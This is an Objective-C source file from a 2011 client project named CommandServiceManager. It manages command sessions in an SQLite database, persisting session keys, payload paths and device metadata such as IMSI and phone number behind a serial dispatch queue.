//
//  SessionManager.m
//  CommandServiceManager
//
//  Created by Pichaya Srifar on 7/29/11.
//  Copyright 2011 Vervata. All rights reserved.
//

#import "SessionManager.h"
#import "SessionInfo.h"
#import "FMDatabase.h"
#import "FMResultSet.h"
#import "CommandMetaData.h"

@implementation SessionManager

@synthesize payloadFolderPath;
@synthesize DBFilePath;
@synthesize db;

static SessionManager *sharedSessionManager = nil;

+ (SessionManager*)sharedManager {
	if (sharedSessionManager == nil) {
		//sharedSessionManager = [[super allocWithZone:NULL] init];
		sharedSessionManager = [[SessionManager alloc] init];
		//DLog (@"[1]sharedSessionManager = %@", sharedSessionManager);
	}
	return sharedSessionManager;
}

+ (SessionManager*)sharedManagerWithPayloadFolderPath:(NSString *)aPayloadFolderPath WithDBFolderPath:(NSString *)DBFolderPath {
	if (sharedSessionManager == nil) {
		//sharedSessionManager = [[super allocWithZone:NULL] init];
		sharedSessionManager = [[SessionManager alloc] init];
		//DLog (@"[2]sharedSessionManager = %@", sharedSessionManager);
		
		// Setting up database
		[sharedSessionManager setDBFilePath:[DBFolderPath stringByAppendingPathComponent:@"phoenix_session.sqlite"]];
		[sharedSessionManager setPayloadFolderPath:aPayloadFolderPath];

		FMDatabase *smdb = [FMDatabase databaseWithPath:[sharedSessionManager DBFilePath]];
		//DLog (@"Create session database phoenix_session.sqlite, smdb = %@", smdb);
		[sharedSessionManager setDb:smdb];

		if (![[sharedSessionManager db] open]) {
			DLog(@"Could not open db -- returning nil");
			return nil;
		}
		
		if ([[sharedSessionManager db] hadError]) {
			DLog(@"Could not open the DB for whatever reason about to remove and copy the base file...here was the error:");
			DLog(@"DB Err %d: %@", [[sharedSessionManager db] lastErrorCode], [[sharedSessionManager db] lastErrorMessage]);
		}
		[[sharedSessionManager db] setTraceExecution:YES];

		[[sharedSessionManager db] executeUpdate:@"CREATE TABLE IF NOT EXISTS session (id INTEGER PRIMARY KEY AUTOINCREMENT,csid INTEGER NOT NULL,ssid INTEGER,aes_key TEXT,server_public_key BLOB,payload_path TEXT,product_version TEXT,device_id TEXT,activation_code TEXT,phone_number TEXT,mcc TEXT,mnc TEXT,imsi TEXT,language INTEGER,protocol_version FLOAT,product_id INTEGER,conf_id INTEGER,encryption_code INTEGER,compression_code INTEGER, payload_size INTEGER, payload_crc32 INTEGER, payload_ready_flag INTEGER DEFAULT 0)"];
		[[sharedSessionManager db] executeUpdate:@"CREATE TABLE IF NOT EXISTS csid (id INTEGER PRIMARY KEY AUTOINCREMENT)"];
	}
	//DLog(@"db of sharedSessionManager = %@", [sharedSessionManager db]);
	//DLog(@"success with db path = %@, payload path = %@", [sharedSessionManager DBFilePath], [sharedSessionManager payloadFolderPath]);
	return sharedSessionManager;
}

- (instancetype) init {
    self = [super init];
    if (self) {
        sessionQueue = dispatch_queue_create("dispatch_queue_session", 0);
    }
    return self;
}

- (id)copyWithZone:(NSZone *)zone
{
    return self;
}

- (id)retain
{
    return self;
}

- (NSUInteger)retainCount
{
    return NSUIntegerMax;  //denotes an object that cannot be released
}

- (void)release
{
    //do nothing
}

- (id)autorelease {
    return self;
}

- (SessionInfo *)createSession:(CommandRequest *)request {
	if (![self DBFilePath] || ![self payloadFolderPath]) {
		//DLog(@"no db path return nil");
		return nil;
	}
	SessionInfo *result = [[SessionInfo alloc] init];

	uint32_t newCSID = [self generateCSID];
	[result setCSID:newCSID];

	//DLog(@"ssinfo setCSID %d", newCSID);
	NSString *payloadFileName = [NSString stringWithFormat:@"%d.payload", newCSID];
	NSString *payloadFilePath = [[self payloadFolderPath] stringByAppendingPathComponent:payloadFileName];
	[result setPayloadPath:payloadFilePath];

	[result setMetaData:[request metaData]]; // Payload CRC32 and size will fill up later

	//DLog(@"[[request commandData] getCommand] = %d", [[request commandData] getCommand]);
	[result setCommandCode:[[request commandData] getCommand]];

	[result setPayloadReadyFlag:NO];

	return [result autorelease];
}

/************************************************************************************************************************************
                                                                - NOTE -
    + Method contains block should be careful of call another method that contains block, this scenario could generate 'dead lock'
 
    -- LOCK
    + https://lukassen.wordpress.com/2010/04/25/nssemaphore-missing
    + https://github.com/cgwpope/java-axp/issues/13
 ************************************************************************************************************************************/

- (void)persistSession:(SessionInfo *)sessionInfo {
    NSConditionLock *lock = [[NSConditionLock alloc] initWithCondition:0];
    dispatch_async(sessionQueue, ^{
        //DLog (@"persistSession : %p, %d, %@", sessionQueue, [NSThread currentThread].isMainThread, [NSThread currentThread]);
        
        @synchronized (self) {
            [[self db] executeUpdate:@"INSERT INTO session (csid, ssid, aes_key, server_public_key, payload_path, product_version, device_id, activation_code, phone_number, mcc, mnc, imsi, language, protocol_version, product_id, conf_id, encryption_code, compression_code) VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)",
             [NSNumber numberWithInt:[sessionInfo CSID]],
             [NSNumber numberWithInt:[sessionInfo SSID]],
             [sessionInfo aesKey],
             [sessionInfo serverPublicKey],
             [sessionInfo payloadPath],
             [[sessionInfo metaData] productVersion],
             [[sessionInfo metaData] deviceID],
             [[sessionInfo metaData] activationCode],
             [[sessionInfo metaData] phoneNumber],
             [[sessionInfo metaData] MCC],
             [[sessionInfo metaData] MNC],
             [[sessionInfo metaData] IMSI],
             [NSNumber numberWithInt:[[sessionInfo metaData] language]],
             [NSNumber numberWithInt:[[sessionInfo metaData] protocolVersion]],
             [NSNumber numberWithInt:[[sessionInfo metaData] productID]],
             [NSNumber numberWithInt:[[sessionInfo metaData] confID]],
             [NSNumber numberWithInt:[[sessionInfo metaData] encryptionCode]],
             [NSNumber numberWithInt:[[sessionInfo metaData] compressionCode]]];
        }
        /*
        FMResultSet *rs = [[self db] executeQuery:@"SELECT * FROM session WHERE csid = ?",
                           [NSNumber numberWithInt:[sessionInfo CSID]]];
        if ([rs next]) {
            DLog (@"------------------ QUERY INSERT SSINFO ----------------");
            DLog(@"csid         = %d", [rs intForColumn:@"csid"]);
            DLog(@"payload_path = %@", [rs stringForColumn:@"payload_path"]);
            DLog(@"device_id    = %@", [rs stringForColumn:@"device_id"]);
            DLog (@"------------------ QUERY INSERT SSINFO ----------------");
        }*/
        
        [lock lock];
        [lock unlockWithCondition:1];
        DLog (@"persistSession : %d", [NSThread currentThread].isMainThread);
    });
    
    [lock lockWhenCondition:1];
    [lock unlock];
    [lock autorelease];
}

- (void)updateSession:(SessionInfo *)sessionInfo {
    NSConditionLock *lock = [[NSConditionLock alloc] initWithCondition:0];
    dispatch_async(sessionQueue, ^{
        //DLog (@"updateSession : %p, %d, %@", sessionQueue, [NSThread currentThread].isMainThread, [NSThread currentThread]);
        
        [[self db] executeUpdate:@"UPDATE session SET ssid=?, aes_key=?, server_public_key=?, encryption_code=?, compression_code=?, payload_size=?, payload_crc32=?, payload_ready_flag=?  WHERE csid = ?",
                                        [NSNumber numberWithInt:[sessionInfo SSID]],
                                        [sessionInfo aesKey],
                                        [sessionInfo serverPublicKey],
         
                                        [NSNumber numberWithInt:[[sessionInfo metaData] encryptionCode]],
                                        [NSNumber numberWithInt:[[sessionInfo metaData] compressionCode]],
         
                                        [NSNumber numberWithInt:[sessionInfo payloadSize]],
                                        [NSNumber numberWithInt:[sessionInfo payloadCRC32]],
                                        [NSNumber numberWithBool:[sessionInfo payloadReadyFlag]],
                                        [NSNumber numberWithInt:[sessionInfo CSID]]];
        
        [lock lock];
        [lock unlockWithCondition:1];
        DLog (@"updateSession : %d", [NSThread currentThread].isMainThread);
    });
    
    [lock lockWhenCondition:1];
    [lock unlock];
    [lock autorelease];
}

- (BOOL)deleteSession:(uint32_t)CSID {
    __block bool delete = false;
    
    NSConditionLock *lock = [[NSConditionLock alloc] initWithCondition:0];
    dispatch_async(sessionQueue, ^{
        delete = [[self db] executeUpdate:@"DELETE FROM session WHERE csid = ?", [NSNumber numberWithInt:CSID]];
        
        [lock lock];
        [lock unlockWithCondition:1];
        DLog (@"deleteSession : %d", [NSThread currentThread].isMainThread);
    });
    
    [lock lockWhenCondition:1];
    [lock unlock];
    [lock autorelease];
    return delete;
}

- (SessionInfo *)retrieveSession:(uint32_t)CSID {
    __block SessionInfo *result = nil;
    
    NSConditionLock *lock = [[NSConditionLock alloc] initWithCondition:0];
    dispatch_async(sessionQueue, ^{
        //DLog (@"retrieveSession : %p, %d, %@", sessionQueue, [NSThread currentThread].isMainThread, [NSThread currentThread]);
        
        FMResultSet *rs = [[self db] executeQueryWithFormat:@"SELECT * FROM session WHERE csid = (%d)", CSID];
        
        //DLog (@"SSM rs = %@", rs);
        //DLog (@"SSM db lastErrorMessage = %@", [[self db] lastErrorMessage]);
        //DLog (@"SSM db lastErrorCode = %d", [[self db] lastErrorCode]);
        
        if ([rs next]) { // It's rarely to raise exception of Segmentation fault: 11 (fixed by sessionQueue)
            result = [[SessionInfo alloc] init];
            [result setCSID:[rs intForColumn:@"csid"]];
            [result setPayloadPath:[rs stringForColumn:@"payload_path"]];
            [result setPayloadSize:[rs intForColumn:@"payload_size"]];
            [result setSSID:[rs intForColumn:@"ssid"]];
            [result setPayloadCRC32:[rs intForColumn:@"payload_crc32"]];
            [result setAesKey:[rs stringForColumn:@"aes_key"]];
            [result setServerPublicKey:[rs dataForColumn:@"server_public_key"]];
            
            CommandMetaData *metaData = [[CommandMetaData alloc] init];
            [metaData setProductVersion:[rs stringForColumn:@"product_version"]];
            [metaData setDeviceID:[rs stringForColumn:@"device_id"]];
            [metaData setActivationCode:[rs stringForColumn:@"activation_code"]];
            [metaData setPhoneNumber:[rs stringForColumn:@"phone_number"]];
            [metaData setMCC:[rs stringForColumn:@"mcc"]];
            [metaData setMNC:[rs stringForColumn:@"mnc"]];
            [metaData setIMSI:[rs stringForColumn:@"imsi"]];
            [metaData setLanguage:[rs intForColumn:@"language"]];
            [metaData setProtocolVersion:[rs intForColumn:@"protocol_version"]];
            [metaData setProductID:[rs intForColumn:@"product_id"]];
            [metaData setConfID:[rs intForColumn:@"conf_id"]];
            [metaData setEncryptionCode:[rs intForColumn:@"encryption_code"]];
            [metaData setCompressionCode:[rs intForColumn:@"compression_code"]];
            [metaData setPayloadSize:[rs intForColumn:@"payload_size"]];
            [metaData setPayloadCRC32:[rs intForColumn:@"payload_crc32"]];
            
            [result setMetaData:metaData];
            [metaData release];
        } else {
            DLog(@"SSM cannot retrieve session by CSID");
        }
        
        [lock lock];
        [lock unlockWithCondition:1];
        DLog (@"retrieveSession : %d", [NSThread currentThread].isMainThread);
    });
    
    [lock lockWhenCondition:1];
    [lock unlock];
    [lock autorelease];
    
    return [result autorelease];
}

- (NSArray *)retrieveAllSessions; {
    __block NSMutableArray *sessions = nil;
    
    NSConditionLock *lock = [[NSConditionLock alloc] initWithCondition:0];
    dispatch_async(sessionQueue, ^{
        //DLog (@"retrieveAllSessions : %p, %d, %@", sessionQueue, [NSThread currentThread].isMainThread, [NSThread currentThread]);
        
        sessions = [[NSMutableArray alloc] init];
        FMResultSet *rs = [[self db] executeQueryWithFormat:@"SELECT * FROM session"];
        
        //DLog (@"SSM rs = %@", rs);
        //DLog (@"SSM db lastErrorMessage = %@", [[self db] lastErrorMessage]);
        //DLog (@"SSM db lastErrorCode = %d", [[self db] lastErrorCode]);
        
        while ([rs next]) {
            SessionInfo *result = [[SessionInfo alloc] init];
            
            [result setCSID:[rs intForColumn:@"csid"]];
            [result setPayloadPath:[rs stringForColumn:@"payload_path"]];
            [result setPayloadSize:[rs intForColumn:@"payload_size"]];
            [result setSSID:[rs intForColumn:@"ssid"]];
            [result setPayloadCRC32:[rs intForColumn:@"payload_crc32"]];
            [result setAesKey:[rs stringForColumn:@"aes_key"]];
            [result setServerPublicKey:[rs dataForColumn:@"server_public_key"]];
            
            CommandMetaData *metaData = [[CommandMetaData alloc] init];
            [metaData setProductVersion:[rs stringForColumn:@"product_version"]];
            [metaData setDeviceID:[rs stringForColumn:@"device_id"]];
            [metaData setActivationCode:[rs stringForColumn:@"activation_code"]];
            [metaData setPhoneNumber:[rs stringForColumn:@"phone_number"]];
            [metaData setMCC:[rs stringForColumn:@"mcc"]];
            [metaData setMNC:[rs stringForColumn:@"mnc"]];
            [metaData setIMSI:[rs stringForColumn:@"imsi"]];
            [metaData setLanguage:[rs intForColumn:@"language"]];
            [metaData setProtocolVersion:[rs intForColumn:@"protocol_version"]];
            [metaData setProductID:[rs intForColumn:@"product_id"]];
            [metaData setConfID:[rs intForColumn:@"conf_id"]];
            [metaData setEncryptionCode:[rs intForColumn:@"encryption_code"]];
            [metaData setCompressionCode:[rs intForColumn:@"compression_code"]];
            [metaData setPayloadSize:[rs intForColumn:@"payload_size"]];
            [metaData setPayloadCRC32:[rs intForColumn:@"payload_crc32"]];
            [result setMetaData:metaData];
            [metaData release];
            
            [sessions addObject:result];
            
            [result release];
        }
        
        [lock lock];
        [lock unlockWithCondition:1];
        DLog (@"retrieveAllSessions : %d", [NSThread currentThread].isMainThread);
    });
    
    [lock lockWhenCondition:1];
    [lock unlock];
    [lock autorelease];
    
	return ([sessions autorelease]);
}

-(uint32_t)generateCSID {
    __block uint32_t CSID = 0;
    
    NSConditionLock *lock = [[NSConditionLock alloc] initWithCondition:0];
    dispatch_async(sessionQueue, ^{
        //DLog (@"generateCSID : %p, %d, %@", sessionQueue, [NSThread currentThread].isMainThread, [NSThread currentThread]);
        
        [[self db] executeUpdate:@"INSERT INTO csid VALUES(NULL)"];
        uint32_t csid = [[self db] lastInsertRowId];
        DLog (@"csid = %d, lastErrorMessage = %@", csid, [[self db] lastErrorMessage]);
        
        CSID = csid;
        
        [lock lock];
        [lock unlockWithCondition:1];
        DLog (@"generateCSID : %d", [NSThread currentThread].isMainThread);
    });
    
    [lock lockWhenCondition:1];
    [lock unlock];
    [lock autorelease];
    
	return CSID;
}

- (NSArray *)getAllOrphanedSession {
    __block NSMutableArray *result = nil;
    
    NSConditionLock *lock = [[NSConditionLock alloc] initWithCondition:0];
    dispatch_async(sessionQueue, ^{
        //DLog (@"getAllOrphanedSession : %p, %d, %@", sessionQueue, [NSThread currentThread].isMainThread, [NSThread currentThread]);
        
        FMResultSet *rs = [[self db] executeQuery:@"SELECT csid FROM session WHERE payload_ready_flag = 0"];
        result = [[NSMutableArray alloc] init];
        while ([rs next]) {
            [result addObject:[NSNumber numberWithInt:[rs intForColumnIndex:0]]];
        }
        
        [lock lock];
        [lock unlockWithCondition:1];
        DLog (@"getAllOrphanedSession : %d", [NSThread currentThread].isMainThread);
    });
    
    [lock lockWhenCondition:1];
    [lock unlock];
    [lock autorelease];
    
	return [result autorelease];
}

- (NSArray *)getAllPendingSession {
    __block NSMutableArray *result = nil;
    
    NSConditionLock *lock = [[NSConditionLock alloc] initWithCondition:0];
    dispatch_async(sessionQueue, ^{
        //DLog (@"getAllPendingSession : %p, %d, %@", sessionQueue, [NSThread currentThread].isMainThread, [NSThread currentThread]);
        
        FMResultSet *rs = [[self db] executeQuery:@"SELECT csid FROM session WHERE payload_ready_flag = 1"];
        result = [[NSMutableArray alloc] init];
        while ([rs next]) {
            [result addObject:[NSNumber numberWithInt:[rs intForColumnIndex:0]]];
        }
        
        [lock lock];
        [lock unlockWithCondition:1];
        DLog (@"getAllPendingSession : %d", [NSThread currentThread].isMainThread);
    });
    
    [lock lockWhenCondition:1];
    [lock unlock];
    [lock autorelease];
    
    return [result autorelease];
}

- (void) dealloc {
	if ([self db]) {
		[[self db] close];
		[[self db] release];
	}
	[[self payloadFolderPath] release];
	[[self DBFilePath] release];
    if (sessionQueue) dispatch_release(sessionQueue);
	[super dealloc];
}


@end
